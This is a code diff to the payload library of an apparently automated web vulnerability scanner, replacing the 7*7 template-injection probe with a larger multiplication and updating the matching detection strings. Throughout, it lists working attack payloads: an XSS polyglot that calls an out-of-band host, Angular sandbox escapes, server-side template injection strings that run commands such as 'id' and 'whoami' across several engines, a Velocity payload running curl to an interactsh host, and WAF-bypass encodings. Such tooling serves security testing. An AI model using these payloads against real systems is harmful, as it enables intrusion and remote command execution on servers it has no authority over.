@@ -19,13 +19,13 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # ================================================================
     "universal": [
         # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
-        "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
-        "{{7*7}}",
-        "${7*7}",
-        "<%= 7*7 %>",
-        "#{7*7}",
-        "[[7*7]]",
-        "{7*7}",
+        "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{1000003*1000003}}${1000003*1000003}<% 1000003*1000003 %>",
+        "{{1000003*1000003}}",
+        "${1000003*1000003}",
+        "<%= 1000003*1000003 %>",
+        "#{1000003*1000003}",
+        "[[1000003*1000003]]",
+        "{1000003*1000003}",
         "{{7*'7'}}",
         "${7*'7'}",
     ],
@@ -35,44 +35,44 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # ================================================================
     "angular": [
         # SIMPLE ARITHMETIC (highest priority - works on most Angular apps)
-        "{{7*7}}",
+        "{{1000003*1000003}}",
         "{{7*'7'}}",
-        "{{49}}",  # Direct number to test reflection
+        "{{1000006000009}}",  # Direct result to distinguish reflection
         # Constructor-based
-        "{{constructor.constructor('return 7*7')()}}",
-        "{{$on.constructor('return 7*7')()}}",
-        "{{[].pop.constructor('return 7*7')()}}",
-        "{{[].push.constructor('return 7*7')()}}",
+        "{{constructor.constructor('return 1000003*1000003')()}}",
+        "{{$on.constructor('return 1000003*1000003')()}}",
+        "{{[].pop.constructor('return 1000003*1000003')()}}",
+        "{{[].push.constructor('return 1000003*1000003')()}}",
         # Error-based detection
         "{{a]}}",
         "{{'a]'}}",
-        # Sandbox bypasses (Angular 1.x - ginandjuice.shop uses older Angular)
+        # Sandbox bypasses for legacy Angular 1.x applications
         "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}",
         "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)');}}",
         '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(document.domain)"].sort(toString.constructor);}}',
         # More sandbox bypasses for different Angular versions
-        "{{$eval.constructor('return 7*7')()}}",
-        "{{$parse.constructor('return 7*7')()}}",
+        "{{$eval.constructor('return 1000003*1000003')()}}",
+        "{{$parse.constructor('return 1000003*1000003')()}}",
         # ------------------------------------------------------------
         # DOUBLE-QUOTE VARIANTS (for servers that error on single quotes)
         # ginandjuice.shop returns 500 on single quotes, but accepts double quotes
         # ------------------------------------------------------------
-        '{{constructor.constructor("return 7*7")()}}',
+        '{{constructor.constructor("return 1000003*1000003")()}}',
         '{{constructor.constructor("alert(1)")()}}',
-        '{{$on.constructor("return 7*7")()}}',
-        '{{[].pop.constructor("return 7*7")()}}',
-        '{{[].push.constructor("return 7*7")()}}',
-        '{{$eval.constructor("return 7*7")()}}',
-        '{{$parse.constructor("return 7*7")()}}',
+        '{{$on.constructor("return 1000003*1000003")()}}',
+        '{{[].pop.constructor("return 1000003*1000003")()}}',
+        '{{[].push.constructor("return 1000003*1000003")()}}',
+        '{{$eval.constructor("return 1000003*1000003")()}}',
+        '{{$parse.constructor("return 1000003*1000003")()}}',
     ],
 
     # ================================================================
     # VUE-SPECIFIC (CSTI)
     # ================================================================
     "vue": [
-        "{{7*7}}",
-        "{{constructor.constructor('return 7*7')()}}",
-        "{{_c.constructor('return 7*7')()}}",
+        "{{1000003*1000003}}",
+        "{{constructor.constructor('return 1000003*1000003')()}}",
+        "{{_c.constructor('return 1000003*1000003')()}}",
     ],
 
     # ================================================================
@@ -95,7 +95,7 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # TWIG-SPECIFIC (SSTI)
     # ================================================================
     "twig": [
-        "{{7*7}}",
+        "{{1000003*1000003}}",
         "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
         "{{['id']|filter('system')}}",
         "{{app.request.server.all|join(',')}}",
@@ -107,7 +107,7 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # FREEMARKER-SPECIFIC (SSTI)
     # ================================================================
     "freemarker": [
-        "${7*7}",
+        "${1000003*1000003}",
         '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
         '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}',
         # OOB
@@ -118,7 +118,7 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # VELOCITY-SPECIFIC (SSTI)
     # ================================================================
     "velocity": [
-        "#set($x=7*7)$x",
+        "#set($x=1000003*1000003)$x",
         "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('id')",
         # OOB
         "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('curl {{INTERACTSH}}')",
@@ -128,7 +128,7 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # MAKO-SPECIFIC (SSTI)
     # ================================================================
     "mako": [
-        "${7*7}",
+        "${1000003*1000003}",
         "${self.module.cache.util.os.popen('id').read()}",
         "<%import os%>${os.popen('id').read()}",
         # OOB
@@ -139,7 +139,7 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # ERB-SPECIFIC (Ruby)
     # ================================================================
     "erb": [
-        "<%= 7*7 %>",
+        "<%= 1000003*1000003 %>",
         "<%= system('id') %>",
         "<%= `id` %>",
         # OOB
@@ -150,9 +150,9 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # POLYGLOTS (work across multiple engines)
     # ================================================================
     "polyglots": [
-        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
-        "${{7*7}}",
-        "{{7*7}}[[7*7]]",
+        "{{1000003*1000003}}${1000003*1000003}<%= 1000003*1000003 %>#{1000003*1000003}",
+        "${{1000003*1000003}}",
+        "{{1000003*1000003}}[[1000003*1000003]]",
     ],
 
     # ================================================================
@@ -160,15 +160,15 @@ PAYLOAD_LIBRARY: Dict[str, List[str]] = {
     # ================================================================
     "waf_bypass": [
         # URL encoded
-        "%7b%7b7*7%7d%7d",
+        "%7b%7b1000003*1000003%7d%7d",
         # Unicode
-        "\\u007b\\u007b7*7\\u007d\\u007d",
+        "\\u007b\\u007b1000003*1000003\\u007d\\u007d",
         # Double encoded
-        "%257b%257b7*7%257d%257d",
+        "%257b%257b1000003*1000003%257d%257d",
         # HTML entities
-        "&#123;&#123;7*7&#125;&#125;",
+        "&#123;&#123;1000003*1000003&#125;&#125;",
         # Mixed case (for JS engines)
-        "{{7*7}}",
+        "{{1000003*1000003}}",
     ],
 }
 
@@ -190,7 +190,7 @@ HIGH_IMPACT_INDICATORS: List[str] = [
 ]
 
 MEDIUM_IMPACT_INDICATORS: List[str] = [
-    "49",            # Arithmetic evaluation (7*7)
+    "1000006000009", # Arithmetic evaluation (1000003*1000003)
     "Config",        # Config access
     "SECRET",        # Secret key access
 ]
@@ -243,11 +243,11 @@ SSTI_ENDPOINT_NAMES = frozenset({
 
 # SSTI payloads for API testing (engine, payload, expected, engine_name)
 API_SSTI_PAYLOADS: List[Tuple[str, str, str]] = [
-    ("{{7*7}}", "49", "jinja2"),
+    ("{{1000003*1000003}}", "1000006000009", "jinja2"),
     ("{{7*'7'}}", "7777777", "jinja2"),
-    ("${7*7}", "49", "freemarker"),
-    ("<%= 7*7 %>", "49", "erb"),
-    ("#{7*7}", "49", "ruby"),
+    ("${1000003*1000003}", "1000006000009", "freemarker"),
+    ("<%= 1000003*1000003 %>", "1000006000009", "erb"),
+    ("#{1000003*1000003}", "1000006000009", "ruby"),
 ]
 
 
@@ -280,7 +280,7 @@ def get_payload_impact_tier(payload: str, response: str) -> int:  # PURE
         return 2
 
     # TIER 1: Arithmetic Evaluation
-    if "49" in response and "7*7" in payload:
+    if "1000006000009" in response and "1000003*1000003" in payload:
         return 1
 
     return 0
@@ -427,7 +427,8 @@ def build_l2_payload_list(
 def get_universal_bypass_payloads() -> List[str]:  # PURE
     """Return universal CSTI bypass payloads for fallback testing."""
     return [
-        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{= 7*7 }}",
-        "${{7*7}}", "{{7*'7'}}", "{{config}}",
+        "{{1000003*1000003}}", "${1000003*1000003}", "#{1000003*1000003}",
+        "<%= 1000003*1000003 %>", "{{= 1000003*1000003 }}",
+        "${{1000003*1000003}}", "{{7*'7'}}", "{{config}}",
         "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
     ]
